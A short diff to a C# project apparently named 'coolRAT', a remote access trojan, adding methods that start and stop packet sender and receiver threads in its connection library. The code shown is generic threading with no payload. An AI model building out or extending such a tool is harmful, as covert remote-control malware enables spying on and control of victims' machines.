@@ -71,6 +71,7 @@ namespace coolRAT.Libs.Connections
 
         public void StartSender()
         {
+            if (PacketSenderTh != null) if (PacketSenderTh.IsAlive) StopSender();
             PacketSenderTh = new Thread(new ThreadStart(SenderLoop));
             PacketSenderTh.IsBackground = true;
             PacketSenderTh.Start();
@@ -81,6 +82,33 @@ namespace coolRAT.Libs.Connections
             if (PacketSenderTh == null) return;
             if (PacketSenderTh.IsAlive) PacketSenderTh.Abort();
             PacketSenderTh = null;
+        }
+
+        public void StartReceiver()
+        {
+            if (PacketReceiverTh != null) if (PacketReceiverTh.IsAlive) StopReceiver();
+            PacketReceiverTh = new Thread(new ThreadStart(ReceiverLoop));
+            PacketReceiverTh.IsBackground = true;
+            PacketReceiverTh.Start();
+        }
+
+        public void StopReceiver()
+        {
+            if (PacketReceiverTh == null) return;
+            if (PacketReceiverTh.IsAlive) PacketReceiverTh.Abort();
+            PacketReceiverTh = null;
+        }
+
+        public void StartAll()
+        {
+            StartSender();
+            StartReceiver();
+        }
+
+        public void StopAll()
+        {
+            StopSender();
+            StopReceiver();
         }
 
 
